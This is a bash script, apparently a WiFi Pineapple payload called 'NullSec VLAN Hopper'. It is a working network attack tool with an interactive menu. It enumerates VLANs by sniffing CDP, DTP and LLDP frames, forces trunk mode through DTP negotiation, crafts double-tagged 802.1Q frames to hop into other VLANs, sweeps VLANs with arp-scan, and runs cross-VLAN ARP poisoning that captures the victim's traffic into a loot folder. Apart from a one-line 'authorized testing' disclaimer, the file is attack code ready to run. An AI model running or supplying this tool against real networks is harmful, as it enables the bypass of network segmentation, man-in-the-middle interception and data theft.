#!/bin/bash
#═══════════════════════════════════════════════════════════════════════════════
# NullSec VLAN Hopper
# 802.1Q VLAN hopping, DTP negotiation, double tagging attacks
#
# For authorized security testing only!
# Credits: Built for Hak5 WiFi Pineapple - https://hak5.org
#═══════════════════════════════════════════════════════════════════════════════

VERSION="1.0"
LOOT_DIR="/mmc/nullsec/vlan-hopper"
DATE_TAG=$(date +%Y%m%d_%H%M%S)
IFACE="eth0"
REPORT="$LOOT_DIR/vlan_report_${DATE_TAG}.txt"

mkdir -p "$LOOT_DIR"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

banner() {
    echo -e "${MAGENTA}"
    cat << 'EOF'
    ╔═══════════════════════════════════════════════════════════════╗
    ║              NULLSEC VLAN HOPPER v1.0                         ║
    ║                                                               ║
    ║          802.1Q VLAN Hopping & Enumeration                    ║
    ╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

log() {
    local level="$1"
    shift
    case "$level" in
        INFO)  echo -e "${GREEN}[INFO]${NC} $*" ;;
        WARN)  echo -e "${YELLOW}[WARN]${NC} $*" ;;
        ALERT) echo -e "${RED}[ALERT]${NC} $*" ;;
        SCAN)  echo -e "${CYAN}[SCAN]${NC} $*" ;;
    esac
    echo "[$(date '+%H:%M:%S')] [$level] $*" >> "$REPORT"
}

# Check and install dependencies
check_deps() {
    for dep in yersinia vconfig tcpdump nmap arp-scan; do
        if ! command -v $dep &>/dev/null; then
            log WARN "$dep not found, installing..."
            opkg install $dep 2>/dev/null || apt-get install -y $dep 2>/dev/null
        fi
    done
}

# Enumerate VLANs via CDP/DTP/LLDP
enum_vlans() {
    log SCAN "Sniffing for VLAN protocols (CDP/DTP/LLDP)..."
    
    # Capture CDP, DTP, LLDP frames
    PCAP="/tmp/vlan_discover.pcap"
    timeout 60 tcpdump -i "$IFACE" -w "$PCAP" \
        'ether proto 0x88cc or ether host 01:00:0c:cc:cc:cc or ether host 01:80:c2:00:00:0e' 2>/dev/null
    
    # Parse CDP for VLAN info
    if tshark -r "$PCAP" -Y cdp 2>/dev/null | grep -q .; then
        log INFO "CDP frames detected!"
        tshark -r "$PCAP" -Y cdp -T fields \
            -e cdp.deviceid -e cdp.portid -e cdp.nativevlan -e cdp.platform 2>/dev/null | \
        while IFS=$'\t' read -r device port vlan platform; do
            log INFO "  Device: $device | Port: $port | Native VLAN: $vlan | Platform: $platform"
            echo "$device|$port|$vlan|$platform" >> "$LOOT_DIR/cdp_results.txt"
        done
    fi
    
    # Parse DTP
    if tshark -r "$PCAP" -Y dtp 2>/dev/null | grep -q .; then
        log ALERT "DTP frames detected — trunk negotiation possible!"
        TRUNK_POSSIBLE=1
    fi
    
    # Parse LLDP
    if tshark -r "$PCAP" -Y lldp 2>/dev/null | grep -q .; then
        log INFO "LLDP frames detected"
        tshark -r "$PCAP" -Y lldp -T fields \
            -e lldp.chassis.id -e lldp.port.id -e lldp.port.desc 2>/dev/null | \
        while IFS=$'\t' read -r chassis port desc; do
            log INFO "  Chassis: $chassis | Port: $port | Desc: $desc"
        done
    fi
    
    rm -f "$PCAP" 2>/dev/null
}

# DTP trunk negotiation attack
dtp_attack() {
    log SCAN "Attempting DTP trunk negotiation..."
    
    if command -v yersinia &>/dev/null; then
        # Enable trunking via DTP
        yersinia dtp -attack 1 -interface "$IFACE" &>/dev/null &
        DTP_PID=$!
        sleep 10
        kill $DTP_PID 2>/dev/null
        
        log INFO "DTP negotiation sent. Checking trunk status..."
        sleep 5
        
        # Verify if we got trunk mode
        if ip -d link show "$IFACE" 2>/dev/null | grep -q "vlan"; then
            log ALERT "TRUNK MODE ACHIEVED! VLAN hopping enabled"
            return 0
        fi
    else
        # Manual DTP frame crafting
        log WARN "yersinia not available, crafting DTP manually..."
        
        # Build raw DTP desirable frame
        python3 -c "
import socket, struct
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x2004))
s.bind(('$IFACE', 0))
# DTP multicast destination
dst = b'\\x01\\x00\\x0c\\xcc\\xcc\\xcc'
src = bytes.fromhex('$(cat /sys/class/net/$IFACE/address | tr -d ':')')
ethertype = struct.pack('!H', 0x2004)
# DTP payload - desirable mode
dtp_payload = b'\\x01'  # Version
dtp_payload += b'\\x00\\x01\\x00\\x05\\xa5'  # Domain TLV
dtp_payload += b'\\x00\\x02\\x00\\x05\\x04'  # Status: desirable
dtp_payload += b'\\x00\\x03\\x00\\x05\\x04'  # Type: ISL
frame = dst + src + ethertype + dtp_payload
s.send(frame)
s.close()
" 2>/dev/null && log INFO "DTP desirable frame sent"
    fi
    return 1
}

# Double tagging attack
double_tag_attack() {
    local target_vlan="$1"
    local native_vlan="${2:-1}"
    
    log SCAN "Launching double-tagging attack (Native: $native_vlan → Target: $target_vlan)..."
    
    # Create 802.1Q tagged interface for native VLAN
    ip link add link "$IFACE" name "${IFACE}.${native_vlan}" type vlan id "$native_vlan" 2>/dev/null
    ip link set "${IFACE}.${native_vlan}" up 2>/dev/null
    
    # Craft double-tagged frames
    python3 << PYEOF
import socket, struct

def build_double_tagged(src_mac, dst_ip, native_vlan, target_vlan):
    """Build double-tagged 802.1Q frame"""
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x8100))
    s.bind(('$IFACE', 0))
    
    # Broadcast destination
    dst = b'\\xff\\xff\\xff\\xff\\xff\\xff'
    src = bytes.fromhex(src_mac.replace(':', ''))
    
    # Outer tag (native VLAN - will be stripped)
    outer_tag = struct.pack('!HH', 0x8100, native_vlan)
    # Inner tag (target VLAN - will be forwarded)  
    inner_tag = struct.pack('!HH', 0x8100, target_vlan)
    # IP ethertype
    ip_ether = struct.pack('!H', 0x0800)
    
    # Simple ARP who-has for discovery
    arp_frame = b'\\x00\\x01\\x08\\x00\\x06\\x04\\x00\\x01'
    arp_frame += src + socket.inet_aton('0.0.0.0')
    arp_frame += b'\\x00\\x00\\x00\\x00\\x00\\x00' + socket.inet_aton(dst_ip)
    
    frame = dst + src + outer_tag + inner_tag + struct.pack('!H', 0x0806) + arp_frame
    s.send(frame)
    s.close()

mac = open('/sys/class/net/$IFACE/address').read().strip()
# Scan target VLAN range
for host in range(1, 255):
    target_ip = f'10.{$target_vlan}.0.{host}'
    try:
        build_double_tagged(mac, target_ip, $native_vlan, $target_vlan)
    except:
        pass
PYEOF
    
    log INFO "Double-tagged frames sent to VLAN $target_vlan"
}

# VLAN sweep - enumerate all active VLANs
vlan_sweep() {
    log SCAN "Sweeping VLAN range 1-4094..."
    
    FOUND_VLANS="$LOOT_DIR/active_vlans.txt"
    > "$FOUND_VLANS"
    
    for vlan in $(seq 1 100); do
        # Create tagged interface
        ip link add link "$IFACE" name "vlan$vlan" type vlan id "$vlan" 2>/dev/null
        ip link set "vlan$vlan" up 2>/dev/null
        ip addr add "10.${vlan}.0.254/24" dev "vlan$vlan" 2>/dev/null
        
        # Quick ARP scan on this VLAN
        HOSTS=$(timeout 3 arp-scan -I "vlan$vlan" "10.${vlan}.0.0/24" 2>/dev/null | grep -c "^10\.")
        
        if [ "$HOSTS" -gt 0 ]; then
            log ALERT "VLAN $vlan is ACTIVE — $HOSTS hosts found!"
            echo "VLAN $vlan: $HOSTS hosts" >> "$FOUND_VLANS"
            
            # Detailed scan of active VLAN
            arp-scan -I "vlan$vlan" "10.${vlan}.0.0/24" 2>/dev/null >> "$LOOT_DIR/vlan${vlan}_hosts.txt"
        fi
        
        # Cleanup
        ip link del "vlan$vlan" 2>/dev/null
    done
    
    TOTAL=$(wc -l < "$FOUND_VLANS" 2>/dev/null)
    log INFO "Sweep complete. $TOTAL active VLANs found"
}

# ARP poison across VLANs
cross_vlan_arp() {
    local target_vlan="$1"
    local gateway="$2"
    local target="$3"
    
    log SCAN "Cross-VLAN ARP poisoning: VLAN $target_vlan ($gateway <-> $target)..."
    
    # Create tagged interface
    ip link add link "$IFACE" name "atk$target_vlan" type vlan id "$target_vlan" 2>/dev/null
    ip link set "atk$target_vlan" up 2>/dev/null
    
    # ARP spoofing on target VLAN
    if command -v arpspoof &>/dev/null; then
        arpspoof -i "atk$target_vlan" -t "$target" "$gateway" &>/dev/null &
        ARP_PID=$!
        
        # Enable forwarding
        echo 1 > /proc/sys/net/ipv4/ip_forward
        
        # Capture traffic
        tcpdump -i "atk$target_vlan" -w "$LOOT_DIR/vlan${target_vlan}_capture.pcap" \
            "host $target" &>/dev/null &
        CAP_PID=$!
        
        log INFO "Cross-VLAN MitM active on VLAN $target_vlan"
        log INFO "Capturing traffic... Press Ctrl+C to stop"
        
        trap "kill $ARP_PID $CAP_PID 2>/dev/null; ip link del atk$target_vlan 2>/dev/null" INT
        wait $CAP_PID
    fi
}

# Interactive menu
menu() {
    echo -e "\n${CYAN}VLAN Attack Modes:${NC}"
    echo -e "  ${GREEN}1)${NC} Enumerate VLANs (CDP/DTP/LLDP sniffing)"
    echo -e "  ${GREEN}2)${NC} DTP Trunk Negotiation Attack"
    echo -e "  ${GREEN}3)${NC} Double-Tagging Attack"
    echo -e "  ${GREEN}4)${NC} VLAN Sweep (enumerate 1-100)"
    echo -e "  ${GREEN}5)${NC} Cross-VLAN ARP Poisoning"
    echo -e "  ${GREEN}6)${NC} Full Auto (all attacks)"
    echo -e "  ${GREEN}0)${NC} Exit"
    echo -ne "\n${YELLOW}Select mode: ${NC}"
    read -r mode
    
    case $mode in
        1) enum_vlans ;;
        2) dtp_attack ;;
        3) 
            echo -ne "${YELLOW}Target VLAN: ${NC}"; read -r tv
            echo -ne "${YELLOW}Native VLAN [1]: ${NC}"; read -r nv
            double_tag_attack "$tv" "${nv:-1}"
            ;;
        4) vlan_sweep ;;
        5)
            echo -ne "${YELLOW}Target VLAN: ${NC}"; read -r tv
            echo -ne "${YELLOW}Gateway IP: ${NC}"; read -r gw
            echo -ne "${YELLOW}Target IP: ${NC}"; read -r tgt
            cross_vlan_arp "$tv" "$gw" "$tgt"
            ;;
        6)
            enum_vlans
            dtp_attack
            vlan_sweep
            ;;
        0) exit 0 ;;
    esac
}

main() {
    banner
    check_deps
    
    while true; do
        menu
    done
}

main "$@"
